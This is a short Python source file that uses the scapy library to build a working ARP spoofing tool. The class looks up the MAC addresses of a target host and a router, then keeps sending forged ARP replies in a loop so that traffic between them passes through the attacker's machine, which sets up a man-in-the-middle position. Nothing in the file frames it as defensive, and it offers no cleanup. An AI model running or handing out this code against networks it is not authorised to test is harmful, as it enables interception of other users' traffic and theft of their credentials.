import scapy.all as scapy
import sys
import time

class arpspoof():
    def __init__(self,targetip,routerip,):
        self.target_ip = targetip
        self.router_ip = routerip
        self.target_mac = str(self.get_mac_address(self.target_ip))
        self.router_mac = str(self.get_mac_address(self.router_ip))

    def get_mac_address(self,ip_address):
        broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_layer = scapy.ARP(pdst=ip_address)
        get_mac_packet=broadcast_layer/arp_layer
        answer=scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
        return answer[0][1].hwsrc

    def spoof(self):
        packet1=scapy.ARP(op=2, hwdst=self.router_mac, pdst=self.router_ip, psrc=self.target_ip)
        packet2=scapy.ARP(op=2, hwdst=self.target_mac, pdst=self.target_ip, psrc=self.router_ip)
        scapy.send(packet1)
        scapy.send(packet2)

    def connect(self):
        try:
            while True:
                self.spoof()
                time.sleep(2)

        except KeyboardInterrupt:
                print('Closing ARP spoofer')
                exit(0)
